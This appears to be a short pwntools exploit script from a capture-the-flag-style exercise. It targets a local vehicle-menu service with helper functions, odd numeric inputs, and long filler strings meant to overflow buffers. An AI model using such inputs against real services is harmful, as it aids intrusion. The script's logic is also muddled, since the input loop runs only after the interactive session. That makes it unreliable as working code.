#!/usr/bin/python
from pwn import *

p = remote('localhost', 9345)
p.sendline('GET /vehicles HTTP/1.1\r\n')

def add(name, model, type, speed, count):
  p.recvuntil(': ')
  p.sendline('1')
  p.recvuntil('Name: ')
  p.sendline(name)
  p.recvuntil('Model: ')
  p.sendline(model)
  p.recvuntil('Type: ')
  p.sendline(type)
  p.recvuntil('Speed: ')
  p.sendline(speed)
  p.recvuntil('Passengers: ')
  p.sendline(str(count))

def list():
  p.recvuntil(': ')
  p.sendline('2')

def rm(show):
  p.recvuntil(': ')
  p.sendline('3')
  p.recvuntil('(y/n): ')
  p.sendline(show)

def update(name, model, type, speed, count):
  p.recvuntil(': ')
  p.sendline('4')
  p.recvuntil('Name: ')
  p.sendline(name)
  p.recvuntil('Model: ')
  p.sendline(model)
  p.recvuntil('Type: ')
  p.sendline(type)
  p.recvuntil('Speed: ')
  p.sendline(speed)
  p.recvuntil('Passengers: ')
  p.sendline(str(count))

cmds = ["1", "35958", "13118", "-40356", "58030", "1222"]
cmds += ["1", "-63080", 'a'*256, 'b'*256, "24612", "1222"]
p.sendline('0'*0x1000)
p.interactive()
for s in cmds:
  p.sendline(s)

